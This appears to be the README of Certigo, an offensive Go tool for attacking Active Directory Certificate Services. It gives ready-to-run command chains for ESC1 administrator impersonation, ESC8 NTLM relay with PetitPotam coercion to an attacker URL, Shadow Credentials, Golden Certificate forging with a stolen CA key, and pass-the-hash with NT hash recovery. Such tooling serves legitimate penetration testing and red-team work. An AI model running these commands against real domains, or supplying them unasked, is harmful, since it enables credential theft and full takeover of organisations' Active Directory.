# Certigo

<p align="center">
  <strong>AD CS enumeration and exploitation tool in Go — Certipy parity in a single static binary.</strong>
</p>

Certigo enumerates Active Directory Certificate Services, detects ESC1–ESC16 misconfigurations, and wires up the follow-on attacks (Shadow Credentials, Golden Certificate, PKINIT, NTLM relay, coercion, RBCD). Built on `gokrb5`, `go-ldap`, `go-msrpc`, `go-ntlmssp`, and `go-pkcs12`. Pure Go, no cgo, cross-compiles to linux / windows / darwin × amd64 / arm64.

## Install

```bash
go install github.com/ajm4n/certigo/cmd/certigo@latest
# or download a release binary from the Releases page
```

## TL;DR

```bash
# enumerate every CA + template, run ESC1-16 detection, pretty table
certigo find -d corp.local -u alice -p Pass123 --dc-host 10.0.0.1 --vulnerable --short

# request an ESC1 cert via /certsrv/ web enrollment (NTLM-over-HTTP, HTTP fallback)
certigo req -d corp.local -u alice --hashes :NTHASH \
            --ca ca.corp.local --ca-name CORP-CA --template ESC1 \
            --upn administrator@corp.local --dc-host 10.0.0.1 \
            --method web --insecure-tls --out admin.pfx

# PKINIT with the issued PFX, drop a TGT, recover the NT hash via U2U + unPAC
certigo auth --pfx admin.pfx --domain corp.local --dc-ip 10.0.0.1 --principal administrator
```

## Subcommands

| Command | What it does |
|---|---|
| `find` | Enumerate every CA + template, run ESC1-ESC16 detection. Filters: `--enabled`, `--vulnerable`, `--enrollable`, `--esc ESC1,ESC4`. Formats: `text`, `short`, `json`, `zip`, `bloodhound`. |
| `auth` | PKINIT with a PFX, write the TGT to a ccache, optionally `--print` the NT hash via U2U + unPAC-the-hash. |
| `req` | Request a cert via DCOM (default), ICPR over RPC (`--method rpc`), or `/certsrv/` web enrollment (`--method web`). NTLM-over-HTTP with auto-fallback HTTPS → HTTP, supports password and pass-the-hash. |
| `shadow` | Add / list / view / clear / remove `msDS-KeyCredentialLink` entries on a target user (Shadow Credentials). Drops a PFX with the new key. |
| `forge` | Sign a Golden Certificate with a stolen CA private key (CN=ANY user impersonation). Writes the `NTDS-CA-Security-Ext` SID extension so the cert passes KB5014754 strong mapping. |
| `template` | Read / write / backup / restore a template via LDAP. `--action make-vulnerable` flips a writable template into ESC1-style enrollee-supplies-subject + Client Auth EKU. |
| `account` | Create / modify / delete user + computer accounts via LDAP (e.g. add a fake computer for RBCD bypassing MachineAccountQuota). |
| `ca` | DCOM ops on a CA: backup signing cert, approve / deny pending requests, add / remove officers, publish / unpublish templates. |
| `req` | (see above) — covers DCOM / RPC / web enrollment paths. |
| `relay` | Listen for HTTP NTLM, relay to `/certsrv/`, drop a PFX per victim. Includes built-in PetitPotam / DFSCoerce / PrinterBug triggers via `--trigger`. |
| `cert` | Local PFX ↔ PEM conversion, key extraction, password change. |
| `parse` | Offline parse of AD CS EVTX logs and registry hives (`.reg`). |
| `ptt` | kirbi → ccache, or pass an existing ccache to `$KRB5CCNAME`. |

Every subcommand takes `certigo <cmd> --help` for the full flag set.

## Common flags

Most subcommands accept the same authentication and transport flags:

| Flag | Meaning |
|---|---|
| `-d`, `--domain` | AD domain (e.g. `corp.local`) |
| `-u`, `--username` | sAMAccountName |
| `-p`, `--password` | password |
| `--hashes LM:NT` | NTLM hashes (LM may be empty: `:NTHASH`) — pass-the-hash |
| `--dc-host`, `--dc-ip` | KDC / DC hostname or IP |
| `-k`, `--kerberos` | use Kerberos (GSSAPI) bind via the ccache in `$KRB5CCNAME` |
| `--ldaps` | use LDAPS (auto-enabled for port 636) |
| `--ldap-insecure` | skip TLS cert verification on LDAPS |
| `--simple-bind` | LDAP simple bind (default: NTLM) |
| `--pfx`, `--pfx-password` | PFX-based auth where supported (`auth`, `shadow`) |
| `--pem-cert`, `--pem-key` | PEM cert / key pair where PFX isn't a fit |

## End-to-end ESC1 chain

```bash
# 1. find a vulnerable template
certigo find -d corp.local -u alice -p Pass123 --dc-host 10.0.0.1 --vulnerable --short

# 2. request an admin cert via that template (web enrollment, NTLM-over-HTTP)
certigo req  -d corp.local -u alice -p Pass123 \
    --ca ca.corp.local --ca-name CORP-CA \
    --template ESC1 --upn administrator@corp.local \
    --dc-host 10.0.0.1 --method web --insecure-tls --out admin.pfx

# 3. PKINIT with the cert + recover the NT hash
certigo auth --pfx admin.pfx --domain corp.local --dc-ip 10.0.0.1 --principal administrator --print
# corp.local\administrator:0:LM:NT:::
```

## ESC8 (NTLM relay → AD CS web enrollment)

```bash
# 1. listen for inbound HTTP NTLM, relay to the CA
certigo relay --listen :80 --target http://ca.corp.local/certsrv/ \
              --template DomainController --out-dir ./loot &

# 2. trigger a coerced auth from a target DC
certigo relay --trigger petitpotam --target-host dc.corp.local \
              --attacker-url 'http://attacker/foo' -d corp.local -u alice -p Pass123

# 3. PKINIT with the captured DC machine cert
certigo auth --pfx ./loot/DC01\$.pfx --domain corp.local --dc-ip 10.0.0.1 --principal 'DC01$' --print
```

## Shadow Credentials

```bash
# add a key cred to alice, drop a PFX we can PKINIT with
certigo shadow add --target alice -d corp.local -u attacker -p ... \
                   --dc-host 10.0.0.1 --out alice.pfx

# PKINIT as alice
certigo auth --pfx alice.pfx --domain corp.local --dc-ip 10.0.0.1 --principal alice --print
```

## Golden Certificate

```bash
# 1. backup the CA signing cert + key (requires CA admin)
certigo ca backup --ca-name CORP-CA --dc-host 10.0.0.1 \
                  -d corp.local -u admin -p ... --out corp-ca.pfx

# 2. forge a cert for any user with the right SID extension
certigo forge --ca-pfx corp-ca.pfx --upn administrator@corp.local \
              --sid S-1-5-21-...-500 --out admin-forged.pfx

# 3. PKINIT
certigo auth --pfx admin-forged.pfx --domain corp.local --dc-ip 10.0.0.1 --principal administrator --print
```

## Output

```
====== Certificate Authorities ======

  0
  CA Name                               : CORP-CA
  DNS Name                              : ca.corp.local
  Web Enrollment NTLM Offered           : Yes
  Enrollment Rights                     :
    Domain Users (ControlAccess)
    ...

====== Certificate Templates ======

  0
  Template Name                         : ESC1
  Enabled                               : Yes
  Schema Version                        : 2
  Enrollee Supplies Subject             : Yes
  Requires Manager Approval             : No
  Extended Key Usage                    :
    Client Authentication (1.3.6.1.5.5.7.3.2)
  Enrollment Rights                     :
    Domain Users (ControlAccess)
    Authenticated Users (ControlAccess)
  [!] Vulnerabilities
    [!] ESC1 - Template allows enrollee-supplied subject with client-auth EKU
```

`certigo find --short` collapses to a one-line-per-template summary; `--format json` / `--format zip` is what you want for piping into another tool; `--format bloodhound` emits the four BloodHound JSON shards (CertTemplates, EnterpriseCAs, RootCAs, AIACAs).

## Building

```bash
git clone https://github.com/ajm4n/certigo
cd certigo
go build ./cmd/certigo
# or
make release        # cross-build via goreleaser
```

Pure Go, no cgo. Go 1.22+. Single static binary.

## License

MIT.
